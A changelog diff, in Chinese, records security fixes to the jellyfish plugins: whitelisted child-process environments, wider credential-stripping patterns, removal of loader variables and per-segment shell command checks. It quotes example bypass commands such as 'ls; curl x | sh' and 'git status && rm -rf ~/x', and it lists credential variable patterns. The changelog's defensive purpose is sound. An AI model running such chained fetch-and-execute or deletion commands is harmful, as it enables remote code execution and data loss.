@@ -16,6 +16,27 @@
 
 ### Changed
 
+- **`jellyfish-plugin-mcp` 的子进程环境改为白名单**（破坏性，安全修复）：此前是「继承父进程全部环境 +
+  叠加配置」，于是 JVM 环境里那些与本插件毫无关系的凭据（`ANTHROPIC_API_KEY`、`OPENAI_API_KEY`、
+  `AWS_SECRET_ACCESS_KEY`…）会一并交给一个不受信的第三方进程。现在只继承
+  `PATH` / `HOME` / `LANG` / `LC_*` / `TMPDIR` / `TEMP` / `TMP` / `USER` / `LOGNAME` / `SHELL`
+  与 Windows 的 `SystemRoot` / `PATHEXT` / `ComSpec` / `windir`，其余一律不带。
+  **要在别的东西上依赖继承的 server 需要补一行**：写到该 server 的 `env` 段即可（显式即允许，
+  与脚本插件的 `${ENV}` 插值是同一条口径）。同时启动日志里的参数值按旗标名遮蔽——
+  `--token sk-xxx`、`--api-key=...` 会打成 `***`（`--path` 这类不含凭据关键词的照旧打印，
+  排查「server 起不来」时它正是要看的东西）。
+- **`jellyfish-plugin-shell` 的默认剔除表补齐了几族凭据**（破坏性，安全修复）：原表是
+  `*KEY*` / `*TOKEN*` / `*SECRET*` / `*PASSWORD*` / `*CREDENTIAL*`，漏掉了 `GITHUB_PAT`（不含这些子串）、
+  `SSH_AUTH_SOCK`、`NETRC`、`HTTP_PROXY`（值里常内嵌 `user:pass@`）、`GPG_PASSPHRASE`、`MYSQL_PWD`。
+  现补上 `*_PAT*` / `*AUTH*` / `*NETRC*` / `*PROXY*` / `*PASSPHRASE*` / `*_PWD`——写法带 `_` 不是笔误，
+  因为 `*PAT*` 会命中 `PATH`、`*PWD*` 会命中 shell 自带的 `PWD`，剔掉它们等于几乎所有命令都 command not found。
+  **两处是有代价的取舍**：`*AUTH*` 会连带剔掉 `SSH_AUTH_SOCK`（`git clone git@...` 拿不到 agent），
+  `*PROXY*` 会让 `curl` 之类的工具不再走代理。要用的写进 `environment` 段显式注入回来。
+- **`jellyfish-plugin-node` / `-python` 不再透传加载器开关**（破坏性，安全修复）：
+  `NODE_OPTIONS`（`--require` 能在网关脚本之前加载任意模块）与 `PYTHONHOME`（换掉整个标准库的位置）
+  移出白名单。`NODE_PATH` / `PYTHONPATH` / `VIRTUAL_ENV` **保留**——它们是「去哪找依赖」，
+  是用户脚本 require / import 到自己依赖的必要条件（网关自己的 SDK 由 `gateway.py` 算路径插进 `sys.path`，
+  不依赖 `PYTHONPATH`），砍掉它们只是砍功能、不增安全。
 - **`jellyfish-plugin-shell` 的命令判定改为「按段」**（安全修复）：执行侧是 `/bin/sh -c 原文`，
   而判定只比对原文前 1~2 个 token，于是 `ls; curl x | sh`、`git status && rm -rf ~/x` 这类命令的
   第一个 token 命中只读表/白名单就被整串免审批执行——白名单与只读表这两个被当作约束的机制同时失效。
